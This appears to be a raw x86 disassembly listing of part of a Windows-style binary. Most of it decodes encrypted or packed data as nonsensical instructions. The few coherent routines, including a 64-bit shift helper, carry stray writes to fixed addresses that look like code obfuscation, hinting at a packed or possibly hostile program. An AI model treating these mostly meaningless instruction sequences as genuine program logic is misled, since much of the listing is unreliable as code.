  408654:	sub    edx,DWORD PTR [eax-0x29]
  408657:	out    0xf5,al
  408659:	mov    ds:0x84182745,al
  40865e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40865f:	inc    edi
  408660:	outs   dx,BYTE PTR ds:[esi]
  408661:	push   cs
  408662:	int    0x91
  408664:	dec    edx
  408665:	cld    
  408666:	add    DWORD PTR [ebx+0x57fd6d8f],0xf15d2364
  408670:	aad    0xf9
  408672:	gs cwde 
  408674:	int    0x33
  408676:	push   ebp
  408677:	loopne 0x408689
  408679:	in     al,dx
  40867a:	xlat   BYTE PTR ds:[ebx]
  40867b:	sub    ebx,DWORD PTR [eax+0x3]
  40867e:	sub    BYTE PTR [esi+0x20],bh
  408681:	xor    al,BYTE PTR [ebp+0x47c1e038]
  408687:	mov    eax,ds:0x5db360ed
  40868c:	xchg   esi,eax
  40868d:	int3   
  40868e:	mov    ds:0x6486b74a,al
  408693:	push   eax
  408694:	sahf   
  408695:	repnz sahf 
  408697:	mov    BYTE PTR [eax+0x37],ah
  40869a:	or     dl,BYTE PTR [ebx-0x4fb8b291]
  4086a0:	scas   eax,DWORD PTR es:[edi]
  4086a1:	daa    
  4086a2:	jmp    0x408681
  4086a4:	or     DWORD PTR [eax],0x26
  4086a7:	jne    0x408682
  4086a9:	call   0x2cc61cea
  4086ae:	in     al,dx
  4086af:	or     bl,BYTE PTR [ecx]
  4086b1:	xchg   DWORD PTR [edx],ebp
  4086b3:	cmp    al,0xdd
  4086b5:	add    BYTE PTR [edi],bl
  4086b7:	sbb    BYTE PTR [edx],cl
  4086b9:	sar    BYTE PTR [edi],0x41
  4086bc:	lds    edx,FWORD PTR [eax+0x5e0d1124]
  4086c2:	cmc    
  4086c3:	dec    esp
  4086c4:	sbb    bh,cl
  4086c6:	outs   dx,DWORD PTR ds:[esi]
  4086c7:	dec    esi
  4086c8:	jg     0x4086b7
  4086ca:	shl    BYTE PTR [esi-0x61cbaea0],cl
  4086d0:	(bad)  
  4086d1:	mov    DWORD PTR [edi-0x193d46ca],0xb7692ed6
  4086db:	ins    DWORD PTR es:[edi],dx
  4086dc:	push   ss
  4086dd:	jne    0x4086bc
  4086df:	cli    
  4086e0:	and    ecx,edx
  4086e2:	mov    ebx,0x3390605a
  4086e7:	addr16 icebp 
  4086e9:	mov    esp,0x3cdb721
  4086ee:	mov    cl,0xe6
  4086f0:	inc    edx
  4086f1:	inc    edi
  4086f2:	in     al,dx
  4086f3:	loopne 0x408740
  4086f5:	cwde   
  4086f6:	(bad)
  4086f9:	jnp    0x40876f
  4086fb:	mov    ebx,0x6046f3bc
  408700:	sbb    DWORD PTR [eax],esp
  408702:	ins    BYTE PTR es:[edi],dx
  408703:	sbb    BYTE PTR [eax+esi*1+0x55],bl
  408707:	xchg   esi,eax
  408708:	fistp  DWORD PTR [eax]
  40870a:	fnop   
  40870c:	xor    al,0x47
  40870e:	adc    eax,DWORD PTR [ecx-0x6421f44d]
  408714:	cwde   
  408715:	xchg   edi,eax
  408716:	fs icebp 
  408718:	leave  
  408719:	and    eax,0xbe0e9ff5
  40871e:	and    BYTE PTR [ebp+0x3a],ch
  408721:	stos   DWORD PTR es:[edi],eax
  408722:	xor    bh,BYTE PTR [eax+0x54]
  408725:	inc    ebx
  408726:	pushf  
  408727:	fcom   st(7)
  408729:	jb     0x4086e0
  40872b:	lods   eax,DWORD PTR ds:[esi]
  40872c:	test   DWORD PTR [ebx-0x6d],ebp
  40872f:	inc    edi
  408730:	add    eax,0x6ba1bde6
  408735:	sti    
  408736:	jb     0x408798
  408738:	retf   0x529a
  40873b:	(bad)  
  40873c:	jno    0x4086d1
  40873e:	mov    al,0xdf
  408740:	in     eax,dx
  408741:	pop    ecx
  408742:	test   eax,0x42acd1f5
  408747:	lahf   
  408748:	imul   esp,DWORD PTR [esi+0x34f0764b],0xaa6b412c
  408752:	in     eax,0xc6
  408754:	xchg   ebx,eax
  408755:	push   edi
  408756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408757:	and    eax,0x55fa4bee
  40875c:	lods   eax,DWORD PTR ds:[esi]
  40875d:	adc    ebp,DWORD PTR [ebx+0x55]
  408760:	cmp    al,0xbe
  408762:	arpl   WORD PTR [ebx],sp
  408764:	hlt    
  408765:	inc    eax
  408766:	add    eax,0xa0925e7e
  40876b:	mov    esp,0x4c66dfe8
  408770:	add    al,0xc2
  408772:	adc    esi,ebp
  408774:	add    eax,0x63d49b12
  408779:	sub    dl,BYTE PTR [ebx+ebp*4+0x318f85f]
  408780:	jmp    0x408790
  408782:	mov    gs,WORD PTR [ecx+0x2f81a599]
  408788:	hlt    
  408789:	mov    edx,0xe889b6af
  40878e:	repz jb 0x408736
  408791:	dec    esp
  408792:	jne    0x40877b
  408794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408795:	and    esi,DWORD PTR [edx-0x46e4b770]
  40879b:	enter  0x890e,0xf2
  40879f:	push   ecx
  4087a0:	int    0xe1
  4087a2:	add    ebx,edi
  4087a4:	or     al,0x13
  4087a6:	xor    al,BYTE PTR [edx-0x41]
  4087a9:	or     dh,al
  4087ab:	retf   
  4087ac:	push   0x2659a42b
  4087b1:	mov    ebx,0x86df395f
  4087b6:	inc    eax
  4087b7:	mul    DWORD PTR ds:0x5768fb43
  4087bd:	xchg   edi,eax
  4087be:	add    al,al
  4087c0:	mov    ebp,ss
  4087c2:	lods   al,BYTE PTR ds:[esi]
  4087c3:	xchg   DWORD PTR [ebx],esp
  4087c5:	sbb    cl,ch
  4087c7:	add    esp,DWORD PTR [ecx]
  4087c9:	lock pop ecx
  4087cb:	sbb    bh,BYTE PTR [ebx-0x43]
  4087ce:	pop    esp
  4087cf:	jnp    0x40883d
  4087d1:	call   0x4ab4d81f
  4087d6:	int    0x2f
  4087d8:	jmp    0xe8f7:0x8140058f
  4087df:	mov    ch,BYTE PTR [ebx]
  4087e1:	pushf  
  4087e2:	mov    ecx,edi
  4087e4:	shrd   eax,ecx,0x2
  4087e8:	or     eax,DWORD PTR [ebp+0x10]
  4087eb:	shr    ecx,0x2
  4087ee:	or     ecx,DWORD PTR [ebp+0x14]
  4087f1:	jmp    0x408b92
  4087f6:	sbb    cl,cl
  4087f8:	ins    DWORD PTR es:[edi],dx
  4087f9:	xchg   esi,eax
  4087fa:	mov    bl,0xba
  4087fc:	cmp    BYTE PTR [edx+ebp*4-0x21],cl
  408800:	xchg   esp,eax
  408801:	nop
  408802:	shl    BYTE PTR [si-0x4131],1
  408807:	jae    0x4087c7
  408809:	mov    esi,0xbebec4bd
  40880e:	scas   al,BYTE PTR es:[edi]
  40880f:	xor    dl,BYTE PTR [edx-0x3ab18c3f]
  408815:	or     eax,0xec929559
  40881a:	aas    
  40881b:	retf   0x953a
  40881e:	or     eax,0xf0b0ba67
  408823:	ins    DWORD PTR es:[edi],dx
  408824:	sbb    eax,0xc5415943
  408829:	push   esi
  40882a:	pop    edi
  40882b:	scas   al,BYTE PTR es:[edi]
  40882c:	jg     0x4087cf
  40882e:	adc    eax,DWORD PTR [edi+ebp*2-0x21]
  408832:	adc    ah,al
  408834:	push   edi
  408835:	xor    al,0x68
  408837:	inc    edi
  408838:	and    ebx,DWORD PTR [edi+0x25c8e51c]
  40883e:	xchg   esi,eax
  40883f:	popf   
  408840:	inc    ecx
  408841:	scas   eax,DWORD PTR es:[edi]
  408842:	push   ss
  408843:	mov    ch,0x87
  408845:	jg     0x4088c5
  408847:	add    DWORD PTR [edi],edx
  408849:	outs   dx,DWORD PTR ds:[esi]
  40884a:	fisub  WORD PTR [eax+eax*1+0x12]
  40884e:	pop    DWORD PTR [edi+0x210e103a]
  408854:	mov    edi,0x5ed84af7
  408859:	dec    esp
  40885a:	das    
  40885b:	daa    
  40885c:	push   es
  40885d:	pop    esi
  40885e:	enter  0x96e0,0x6a
  408862:	lods   al,BYTE PTR ds:[esi]
  408863:	and    eax,0x7dd47884
  408868:	sbb    DWORD PTR [esi-0x6bd1bc34],ecx
  40886e:	mov    ah,0xb4
  408870:	ret    
  408871:	mov    cl,0xaf
  408873:	jb     0x2b580668
  408879:	fdivr  DWORD PTR [edi-0x47]
  40887c:	sub    esp,esi
  40887e:	mov    ecx,0xbfe7aacc
  408883:	add    DWORD PTR [edi],edi
  408885:	rol    BYTE PTR [ebx+eiz*1+0x46135e7],cl
  40888c:	mov    ebx,0x55a0b8d6
  408891:	test   BYTE PTR [edx-0x5e0bf002],ah
  408897:	xchg   BYTE PTR [ebx+0xa2ecf93],ah
  40889d:	fild   DWORD PTR [ebx-0x6a62c19]
  4088a3:	sbb    eax,0xa2838703
  4088a8:	jmp    0x408929
  4088aa:	lods   al,BYTE PTR ds:[esi]
  4088ab:	jb     0x4088f3
  4088ad:	cmp    ah,BYTE PTR [edi]
  4088af:	add    eax,0xaf2710ba
  4088b4:	clc    
  4088b5:	test   al,0xc1
  4088b7:	in     al,dx
  4088b8:	test   al,0x11
  4088ba:	and    al,0xd3
  4088bc:	inc    edx
  4088bd:	sbb    al,BYTE PTR [eax]
  4088bf:	jns    0x40890c
  4088c1:	rcl    bl,0x1c
  4088c4:	mov    bl,0x8b
  4088c6:	mov    dh,0x85
  4088c8:	lods   al,BYTE PTR ds:[esi]
  4088c9:	dec    edx
  4088ca:	pop    ecx
  4088cb:	and    eax,0xbb655e27
  4088d0:	pop    ss
  4088d1:	xor    DWORD PTR [esi],ecx
  4088d3:	pusha  
  4088d4:	xlat   BYTE PTR ds:[ebx]
  4088d5:	out    0x92,al
  4088d7:	fidivr WORD PTR [edi+0x9]
  4088da:	fimul  WORD PTR [ebp+0x7]
  4088dd:	test   al,0x4d
  4088df:	mov    ebx,0x31f6de72
  4088e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088e5:	jb     0x4088a4
  4088e7:	jg     0x40892a
  4088e9:	jp     0x408964
  4088eb:	jno    0x40891e
  4088ed:	jg     0x408939
  4088ef:	mov    al,ds:0x768e16ea
  4088f4:	xor    DWORD PTR [eax+0x9],eax
  4088f7:	scas   eax,DWORD PTR es:[edi]
  4088f8:	inc    ebp
  4088f9:	push   cs
  4088fa:	call   0x6ef0:0x66f6787c
  408901:	sub    DWORD PTR [edi+0x11f15920],0x44cac7fc
  40890b:	lock xor DWORD PTR [ecx-0x63],esp
  40890f:	mov    bl,0x1a
  408911:	add    eax,0x55b6d1c9
  408916:	xor    DWORD PTR [ebp-0x188f9ab8],eax
  40891c:	into   
  40891d:	sub    eax,0xe9595393
  408922:	fadd   QWORD PTR [ebp+edi*2+0x3d75355e]
  408929:	call   0xd2115225
  40892e:	inc    ecx
  40892f:	lahf   
  408930:	std    
  408931:	sbb    BYTE PTR [edx+0x57],dh
  408934:	dec    ebp
  408935:	adc    BYTE PTR [eax],bl
  408937:	loop   0x4088c9
  408939:	out    dx,al
  40893a:	and    DWORD PTR [esi],ebx
  40893c:	xor    bl,BYTE PTR [ebp-0x64]
  40893f:	adc    eax,0xff9c525c
  408944:	add    edx,DWORD PTR ds:0x6d19d069
  40894a:	adc    eax,0x9f87bf8e
  40894f:	shl    BYTE PTR [edi],1
  408951:	aas    
  408952:	xor    eax,0xb1a63fae
  408957:	adc    DWORD PTR [ecx],eax
  408959:	or     bl,BYTE PTR [ebx]
  40895b:	mov    WORD PTR [edx+edx*2-0x64f23724],es
  408962:	das    
  408963:	sub    bh,bl
  408965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408966:	mov    eax,0x565e3aaf
  40896b:	lods   eax,DWORD PTR ds:[esi]
  40896c:	rcr    BYTE PTR [ebp+0x1c],1
  40896f:	fsubr  st,st(2)
  408971:	shr    BYTE PTR [esp+ebp*2],0x13
  408975:	pop    ebx
  408976:	push   esi
  408977:	sbb    BYTE PTR [ecx+0x3a],bh
  40897a:	arpl   WORD PTR [ecx+0x3eab72f9],di
  408980:	jle    0x40891a
  408982:	sbb    eax,0x289c7c0c
  408987:	jb     0x4089e9
  408989:	jb     0x40893c
  40898b:	sbb    bh,BYTE PTR [edx]
  40898d:	jb     0x4089ea
  40898f:	push   ss
  408990:	ins    BYTE PTR es:[edi],dx
  408991:	outs   dx,BYTE PTR ds:[esi]
  408992:	(bad)  
  408993:	repnz mov ecx,0xc04c5976
  408999:	jns    0x408a0a
  40899b:	fwait
  40899c:	xor    eax,0xd569fee5
  4089a1:	xor    BYTE PTR [eax],cl
  4089a3:	mov    dl,0x5a
  4089a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089a6:	add    ecx,DWORD PTR [esi+0x597009f]
  4089ac:	pop    edi
  4089ad:	out    dx,eax
  4089ae:	inc    esi
  4089af:	sub    eax,0x40f18017
  4089b4:	xchg   esp,eax
  4089b5:	mov    cl,0xfa
  4089b7:	jnp    0x4089fa
  4089b9:	pop    ecx
  4089ba:	xor    ah,BYTE PTR [ecx]
  4089bc:	cmp    dl,ah
  4089be:	std    
  4089bf:	mov    eax,0xcbfffcb
  4089c4:	outs   dx,BYTE PTR ds:[esi]
  4089c5:	test   al,0x72
  4089c7:	ss sub al,0x2b
  4089ca:	dec    ebx
  4089cb:	call   0xdb76e593
  4089d0:	adc    DWORD PTR [ebx+0x16fbf151],esp
  4089d6:	mov    ebp,0xa9e86217
  4089db:	inc    edx
  4089dc:	cdq    
  4089dd:	cmp    DWORD PTR ds:0x54c35a41,edi
  4089e3:	shl    dh,cl
  4089e5:	adc    eax,0x3ec18ce1
  4089ea:	xchg   edx,eax
  4089eb:	pop    edx
  4089ec:	push   ebp
  4089ed:	xchg   ecx,eax
  4089ee:	xchg   edi,eax
  4089ef:	pop    ecx
  4089f0:	ins    DWORD PTR es:[edi],dx
  4089f1:	std    
  4089f2:	sub    DWORD PTR [ebx+0x28],esp
  4089f5:	int    0x61
  4089f7:	mov    BYTE PTR [ebx-0x28],0xc7
  4089fb:	leave  
  4089fc:	jp     0x4089cb
  4089fe:	fist   DWORD PTR [esi]
  408a00:	and    eax,0x8ea3f1f2
  408a05:	push   ecx
  408a06:	pop    ebp
  408a07:	enter  0x3db8,0x78
  408a0b:	and    BYTE PTR [ebx-0xfcda13f],bl
  408a11:	xchg   edx,eax
  408a12:	dec    edi
  408a13:	lods   al,BYTE PTR ds:[esi]
  408a14:	test   DWORD PTR [edx],edx
  408a16:	in     al,0xb6
  408a18:	int    0x39
  408a1a:	push   cs
  408a1b:	inc    ecx
  408a1c:	push   0x8cbbc01c
  408a21:	leave  
  408a22:	jmp    0x32423d0f
  408a27:	cmc    
  408a28:	cmc    
  408a29:	das    
  408a2a:	push   ds
  408a2b:	call   0x8a69e40c
  408a30:	adc    al,0x69
  408a32:	stos   DWORD PTR es:[edi],eax
  408a33:	mov    ds:0x7dc64c3b,eax
  408a38:	std    
  408a39:	mov    eax,ds:0x6fe838b3
  408a3e:	sub    BYTE PTR [eax-0x4e],bh
  408a41:	add    ebx,edi
  408a43:	sub    al,0xd
  408a45:	dec    edx
  408a46:	jp     0x408a45
  408a48:	pop    esp
  408a49:	inc    ecx
  408a4a:	dec    esi
  408a4b:	cmp    BYTE PTR [ebx-0x44],bh
  408a4e:	imul   DWORD PTR [eax]
  408a50:	jno    0x408acc
  408a52:	mov    ds:0x3a5731a2,eax
  408a57:	mov    WORD PTR ds:0xc4d40e4d,es
  408a5d:	in     eax,dx
  408a5e:	push   0x149780f9
  408a63:	test   DWORD PTR [ebp-0x1],eax
  408a66:	xchg   ebp,eax
  408a67:	and    dh,ch
  408a69:	mov    esp,0x494c632c
  408a6e:	jo     0x408a70
  408a70:	imul   esi,DWORD PTR [edi],0x2cf226b5
  408a76:	cdq    
  408a77:	sbb    dl,BYTE PTR [eax]
  408a79:	mov    ebx,0x77e64453
  408a7e:	mov    ebx,0xfc037387
  408a83:	cmp    dl,BYTE PTR [eax+ecx*4+0x7c]
  408a87:	in     eax,dx
  408a88:	add    edi,DWORD PTR [eax+0x4013c9a2]
  408a8e:	dec    BYTE PTR [edx-0x69]
  408a91:	xchg   DWORD PTR [esi-0x44],esi
  408a94:	pop    DWORD PTR [esi-0x15]
  408a97:	into   
  408a98:	aaa    
  408a99:	test   eax,0x4f19951a
  408a9e:	mov    ds:0xc180cf43,eax
  408aa3:	mov    ch,0x4b
  408aa5:	cmp    eax,0x9fe7af65
  408aaa:	jmp    DWORD PTR [esi]
  408aac:	jmp    0x1caef53c
  408ab1:	xlat   BYTE PTR ds:[ebx]
  408ab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ab3:	sahf   
  408ab4:	push   ebp
  408ab5:	retf   
  408ab6:	pop    eax
  408ab7:	push   esp
  408ab8:	aam    0x76
  408aba:	popa   
  408abb:	in     al,dx
  408abc:	sub    al,0x8b
  408abe:	xchg   BYTE PTR [edx],al
  408ac0:	ret    0x7185
  408ac3:	popf   
  408ac4:	fwait
  408ac5:	mov    BYTE PTR [eax-0x42],cl
  408ac8:	ja     0x408a94
  408aca:	sbb    eax,0xdbd12990
  408acf:	jmp    0x408b0c
  408ad1:	out    0x9c,eax
  408ad3:	xor    eax,0xc6f51ecb
  408ad8:	mov    eax,ds:0xfdca278c
  408add:	cmp    BYTE PTR [ecx],bl
  408adf:	inc    ebp
  408ae0:	adc    ebx,DWORD PTR [ebp-0x1e7ee4cb]
  408ae6:	clc    
  408ae7:	dec    esi
  408ae8:	lock lods al,BYTE PTR ds:[esi]
  408aea:	lods   al,BYTE PTR ds:[esi]
  408aeb:	or     al,0x14
  408aed:	lods   eax,DWORD PTR ds:[esi]
  408aee:	xchg   esp,eax
  408aef:	adc    BYTE PTR [edi+0x55],dh
  408af2:	lahf   
  408af3:	mov    WORD PTR [edx-0x32f4ef49],es
  408af9:	stc    
  408afa:	cmp    dh,BYTE PTR [eax+0x5d5ee23e]
  408b00:	add    eax,0xf5b3744e
  408b05:	xor    BYTE PTR [eax+0x1f677885],al
  408b0b:	xchg   edx,eax
  408b0c:	ret    0xbcc7
  408b0f:	repz mov fs,edi
  408b12:	in     al,dx
  408b13:	(bad)  
  408b14:	mov    edi,0xab6c1cfa
  408b19:	cmp    DWORD PTR [edi],ecx
  408b1b:	test   al,0xaa
  408b1d:	sub    BYTE PTR [ebx],bl
  408b1f:	jl     0x408b84
  408b21:	or     al,0x94
  408b23:	lods   eax,DWORD PTR ds:[esi]
  408b24:	lock mov ds:0xea6899c5,eax
  408b2a:	mov    eax,0xe7d9a818
  408b2f:	or     eax,0x9c6a8db7
  408b34:	adc    esp,DWORD PTR [edi+0x782f83ce]
  408b3a:	jge    0x408ae6
  408b3c:	mov    WORD PTR [eax-0x79a3fa3c],gs
  408b42:	xchg   ebp,eax
  408b43:	mov    al,0x44
  408b45:	cmp    bl,dl
  408b47:	mov    ebp,0x8c579a5f
  408b4c:	cld    
  408b4d:	inc    edi
  408b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b4f:	jl     0x408b46
  408b51:	lods   al,BYTE PTR ds:[esi]
  408b52:	mov    ch,0x3a
  408b54:	and    BYTE PTR ds:0x7649c4a8,bh
  408b5a:	fcomp  QWORD PTR [ebx+edi*8-0x7f]
  408b5e:	loope  0x408b67
  408b60:	push   esi
  408b61:	adc    eax,0x85558c83
  408b66:	push   ecx
  408b67:	into   
  408b68:	enter  0xe2a4,0xb6
  408b6c:	add    eax,0x3e13302c
  408b71:	sbb    eax,0x5c03a680
  408b76:	ins    DWORD PTR es:[edi],dx
  408b77:	dec    eax
  408b78:	push   cs
  408b79:	mov    dl,0x83
  408b7b:	call   0x724bab15
  408b80:	xor    DWORD PTR [ebx+0x1f4f18f],ecx
  408b86:	sbb    esp,DWORD PTR [eax+0x575209b7]
  408b8c:	push   ss
  408b8d:	adc    eax,0x4b3b2363
  408b92:	cmp    edx,eax
  408b94:	jne    0x408ba3
  408b9a:	cmp    DWORD PTR [ebp+0xc],ecx
  408b9d:	je     0x408bb3
  408ba3:	push   DWORD PTR [ebp+0x20]
  408ba6:	push   DWORD PTR [ebp+0x1c]
  408ba9:	push   DWORD PTR [ebp+0x18]
  408bac:	push   ebx
  408bad:	push   esi
  408bae:	call   0x411472
  408bb3:	pop    edi
  408bb4:	leave  
  408bb5:	ret    0x1c
  408bb8:	cmp    cl,0x40
  408bbb:	jae    0x408bf8
  408bc1:	cmp    cl,0x20
  408bc4:	mov    DWORD PTR ds:0x4282dd,0x1ce5
  408bce:	jae    0x408be4
  408bd4:	xor    DWORD PTR ds:0x4284a1,0x6917
  408bde:	shrd   eax,edx,cl
  408be1:	shr    edx,cl
  408be3:	ret    
  408be4:	mov    eax,edx
  408be6:	xor    edx,edx
  408be8:	and    cl,0x1f
  408beb:	mov    DWORD PTR ds:0x4284f9,0x321d
  408bf5:	shr    eax,cl
  408bf7:	ret    
  408bf8:	xor    eax,eax
  408bfa:	xor    edx,edx
  408bfc:	ret    
  408bfd:	push   ebp
  408bfe:	mov    ebp,esp
  408c00:	jmp    0x408e7f
  408c05:	addr16 hlt 
  408c07:	js     0x408c4d
  408c09:	jl     0x408c57
  408c0b:	jnp    0x408c09
  408c0d:	dec    edx
  408c0e:	xlat   BYTE PTR ds:[ebx]
  408c0f:	pop    esi
  408c10:	sahf   
  408c11:	(bad)  
  408c12:	gs cwde 
  408c14:	jecxz  0x408bd3
  408c16:	jns    0x408bd6
  408c18:	mov    esi,0xbebec279
  408c1d:	into   
  408c1e:	pop    edx
  408c1f:	and    al,0x92
  408c21:	pop    ss
  408c22:	repz cli 
  408c24:	dec    eax
  408c25:	pop    edx
  408c26:	jbe    0x408be4
  408c28:	test   BYTE PTR [eax+ebp*8+0x5c18f0e9],ah
  408c2f:	inc    edi
  408c30:	xor    BYTE PTR [ecx+edx*2],cl
  408c33:	(bad)  
  408c34:	clc    
  408c35:	dec    ebp
  408c36:	mov    edx,0x58b90831
  408c3b:	out    dx,al
  408c3c:	xchg   esi,eax
  408c3d:	add    al,0x1a
  408c3f:	stos   BYTE PTR es:[edi],al
  408c40:	push   0xffffff90
  408c42:	jecxz  0x408ca7
  408c44:	dec    ebx
  408c45:	cli    
  408c46:	mov    edx,0xdba42c92
  408c4b:	(bad)  
  408c4d:	cmp    dl,BYTE PTR [edx+0x72]
  408c50:	jmp    0xcd225bef
  408c55:	fwait
  408c56:	mov    ah,cl
  408c58:	cmc    
  408c59:	in     eax,dx
  408c5a:	dec    ebx
  408c5b:	outs   dx,DWORD PTR ds:[esi]
  408c5c:	or     al,0x70
  408c5e:	push   cs
  408c5f:	mov    ebp,0x49e765a1
  408c64:	cmp    ebp,DWORD PTR [edi+0x4a]
  408c67:	push   ss
  408c68:	outs   dx,DWORD PTR ds:[esi]
  408c69:	shr    BYTE PTR ss:[eax+0x3efc914e],cl
  408c70:	dec    ecx
  408c71:	pop    esi
  408c72:	xchg   esi,eax
  408c73:	or     DWORD PTR [ecx-0x73],esp
  408c76:	adc    esi,DWORD PTR ds:0xccb19ab6
  408c7c:	stos   BYTE PTR es:[edi],al
  408c7d:	mov    bh,0x18
  408c7f:	test   BYTE PTR [eax+0x44c38c2e],bh
  408c85:	push   ebp
  408c86:	adc    eax,0xb427529f
  408c8b:	ins    BYTE PTR es:[edi],dx
  408c8c:	shl    DWORD PTR [ecx+0xec8395e],0x2b
  408c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c94:	stc    
  408c95:	mov    eax,0xcc077a9b
  408c9a:	and    DWORD PTR [edi],esp
  408c9c:	mov    bl,0xef
  408c9e:	mov    ebx,DWORD PTR [ebx+0x69]
  408ca1:	mov    ebp,0xa6a5be66
  408ca6:	pushf  
  408ca7:	pop    ecx
  408ca8:	sti    
  408ca9:	sahf   
  408caa:	arpl   sp,si
  408cac:	pop    esp
  408cad:	jbe    0x408ceb
  408caf:	and    DWORD PTR [eax+eax*4+0x64],ebx
  408cb3:	sub    BYTE PTR [edx+edx*2+0x62],al
  408cb7:	retf   
  408cb8:	jle    0x408c8c
  408cba:	xchg   ebp,eax
  408cbb:	fadd   DWORD PTR [ebx-0x37]
  408cbe:	ins    DWORD PTR es:[edi],dx
  408cbf:	dec    ebp
  408cc0:	mov    WORD PTR [eax+0x3f],gs
  408cc3:	(bad)
  408cc7:	popa   
  408cc8:	scas   al,BYTE PTR es:[edi]
  408cc9:	jno    0x408cd9
  408ccb:	push   0x9d8ef8e
  408cd0:	jbe    0x408c52
  408cd2:	dec    edx
  408cd3:	mov    cl,0x1f
  408cd5:	xor    dl,BYTE PTR [edx]
  408cd7:	and    eax,0x8a75a88b
  408cdc:	push   ecx
  408cdd:	mov    al,ds:0xf2d7b067
  408ce2:	(bad)  
  408ce3:	clc    
  408ce4:	push   esp
  408ce5:	mov    edi,0xc69547fd
  408cea:	out    0xc,eax
  408cec:	cs dec eax
  408cee:	inc    edi
  408cef:	shl    DWORD PTR [esp+eax*2-0x396be830],0xfc
  408cf7:	inc    esi
  408cf8:	xlat   BYTE PTR ds:[ebx]
  408cf9:	out    0xac,eax
  408cfb:	jno    0x408cc3
  408cfd:	icebp  
  408cfe:	lea    ebp,[ebp+0x50]
  408d01:	enter  0xc27d,0x71
  408d05:	retf   
  408d06:	mov    bh,BYTE PTR [ecx-0x63]
  408d09:	int3   
  408d0a:	sbb    eax,0x6e655f98
  408d0f:	adc    bh,cl
  408d11:	ds popf 
  408d13:	out    0xe6,al
  408d15:	aam    0x11
  408d17:	jl     0x408d5e
  408d19:	pusha  
  408d1a:	daa    
  408d1b:	jg     0x408d53
  408d1d:	xchg   ecx,eax
  408d1e:	ret    
  408d1f:	dec    esp
  408d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d21:	lock mov ebp,0x36d33e74
  408d27:	pusha  
  408d28:	ja     0x408d52
  408d2a:	inc    ecx
  408d2b:	adc    BYTE PTR [eax-0x54f2a554],bh
  408d31:	ja     0x408d8a
  408d33:	add    ebp,ebp
  408d35:	fldenv [eax]
  408d37:	hlt    
  408d38:	adc    DWORD PTR [edx+edx*2-0x34d934c7],edi
  408d3f:	pusha  
  408d40:	dec    ecx
  408d41:	pop    ecx
  408d42:	xchg   edx,eax
  408d43:	push   cs
  408d44:	ja     0x408d37
  408d46:	daa    
  408d47:	inc    eax
  408d48:	outs   dx,DWORD PTR ds:[esi]
  408d49:	push   es
  408d4a:	call   0x57b4:0xcdb2
  408d50:	in     al,dx
  408d51:	inc    ebp
  408d52:	nop
  408d53:	shr    BYTE PTR [eax],1
  408d55:	aaa    
  408d56:	pushf  
  408d57:	loopne 0x408da4
  408d59:	xchg   esi,eax
  408d5a:	cmp    BYTE PTR [edi-0x10],al
  408d5d:	retf   0xa26b
  408d60:	lahf   
  408d61:	pop    ss
  408d62:	in     eax,dx
  408d63:	mov    edx,0x2c9a2ddd
  408d68:	pop    ebx
  408d69:	ja     0x408d06
  408d6b:	fcom   DWORD PTR ds:[edx]
  408d6e:	xor    bh,BYTE PTR [esi-0x60]
  408d71:	dec    esi
  408d72:	test   al,0xb0
  408d74:	xor    DWORD PTR [esi],ecx
  408d76:	push   cs
  408d77:	xor    edx,DWORD PTR [edi-0x3e]
  408d7a:	push   esp
  408d7b:	push   es
  408d7c:	popf   
  408d7d:	frstor es:[eax]
  408d80:	outs   dx,BYTE PTR ds:[esi]
  408d81:	mov    eax,0xbe238a59
  408d86:	(bad)  
  408d87:	aad    0x18
  408d89:	xor    ebp,DWORD PTR [ebp+0x5b990baa]
  408d8f:	cmp    al,dh
  408d91:	mov    ecx,0x56f51501
  408d96:	enter  0x5893,0x3
  408d9a:	(bad)  
  408d9b:	cmc    
  408d9c:	ret    
  408d9d:	aaa    
  408d9e:	push   edx
  408d9f:	repz into 
  408da1:	iret   
  408da2:	enter  0x86cb,0xd6
  408da6:	xor    DWORD PTR [esi+esi*2+0x5e5caca5],edi
  408dad:	xor    al,0x84
  408daf:	in     eax,0x67
  408db1:	add    al,0xe7
  408db3:	and    bl,dh
  408db5:	push   ss
  408db6:	sbb    BYTE PTR [ecx-0xb001643],ch
  408dbc:	inc    eax
  408dbd:	faddp  st(2),st
  408dbf:	mov    dh,0x25
  408dc1:	mov    cs,WORD PTR [ebx+0x2efd0bcd]
  408dc7:	test   eax,0xec0c934b
  408dcc:	adc    esp,eax
  408dce:	pop    edx
  408dcf:	add    cl,BYTE PTR [ecx-0x77]
  408dd2:	and    eax,0xd2d5dc49
  408dd7:	das    
  408dd8:	jp     0x408df6
  408dda:	sub    BYTE PTR [edi+0x6a4735b6],0xc7
  408de1:	jnp    0x408d7b
  408de3:	inc    ecx
  408de4:	(bad)  
  408de5:	cli    
  408de6:	clc    
  408de7:	jb     0x408e32
  408de9:	test   BYTE PTR [eax+0x223eafc5],al
  408def:	xor    bl,bl
  408df1:	mov    dh,0x61
  408df3:	pushf  
  408df4:	mov    esp,0x997ed47a
  408df9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dfa:	xlat   BYTE PTR ds:[ebx]
  408dfb:	fld    TBYTE PTR [ebx+0x78c918fc]
  408e01:	push   ss
  408e02:	loopne 0x408dd3
  408e04:	stos   BYTE PTR es:[edi],al
  408e05:	mov    ds:0x58fd2422,eax
  408e0a:	dec    esp
  408e0b:	adc    ebx,DWORD PTR [ecx]
  408e0d:	out    0xcd,al
  408e0f:	pop    ecx
  408e10:	pop    edx
  408e11:	push   ss
  408e12:	sub    al,0xfd
  408e14:	sub    edx,DWORD PTR [esp+edi*4+0x3929538]
  408e1b:	mov    eax,ds:0x49172593
  408e20:	popf   
  408e21:	cmp    eax,0x357e5f15
  408e26:	jo     0x408e48
  408e28:	xchg   BYTE PTR [edx],bh
  408e2a:	call   0xc411:0x58aecfca
  408e31:	out    dx,al
  408e32:	mov    ds:0xc906c7e2,eax
  408e37:	popf   
  408e38:	aad    0x37
